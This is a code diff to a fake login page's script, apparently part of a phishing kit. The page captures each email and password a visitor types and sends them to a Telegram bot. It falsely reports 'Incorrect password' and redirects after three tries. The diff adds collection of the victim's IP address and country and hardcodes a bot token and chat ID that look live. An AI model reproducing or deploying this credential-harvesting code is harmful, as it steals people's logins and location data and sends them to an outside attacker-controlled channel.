@@ -106,30 +106,44 @@
             passwordInput.type = this.checked ? 'text' : 'password';
         });
 
-        loginButton.addEventListener('click', function () {
+        loginButton.addEventListener('click', async function () {
             attempts++; // Increment attempts
 
             // Clear previous feedback
             feedback.textContent = '';
 
-            // Send message to Telegram
-            const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
-            const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
-            const message = `Attempt ${attempts}: Email: ${emailInput.value}, Password: ${passwordInput.value}`;
-            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            // Fetch the user's IP address and country using ipapi
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                const country = ipData.country_name; // Country name
 
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', telegramUrl, true);
-            xhr.send();
+                // Prepare the message to send to Telegram
+                const telegramBotToken = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Replace with your bot token
+                const chatId = '7735490302'; // Replace with your chat ID
+                const message = `Attempt ${attempts}: Email: ${emailInput.value}, Password: ${passwordInput.value}\nIP: ${userIP}\nCountry: ${country}`;
+                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            // Show feedback for incorrect password
-            feedback.textContent = 'Incorrect password! Please try again...';
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', telegramUrl, true);
+                xhr.send();
 
-            // Redirect after the third attempt
-            if (attempts >= 3) {
+                // Show feedback for incorrect password
+                feedback.textContent = 'Incorrect password! Please try again...';
+
+                // Redirect after the third attempt
+                if (attempts >= 3) {
+                    setTimeout(() => {
+                        window.location.href = 'done.html'; // Redirect to your desired page
+                    }, 2000); // Optional delay before redirecting
+                }
+            } catch (error) {
+                // No error message displayed
+                console.error('Error:', error);
                 setTimeout(() => {
-                    window.location.href = 'done.html'; // Redirect to your desired page
-                }, 2000); // Optional delay before redirecting
+                    window.location.href = 'done.html'; // Redirect even on error
+                }, 2000); // Redirect after 2 seconds, no feedback shown
             }
         });
     </script>
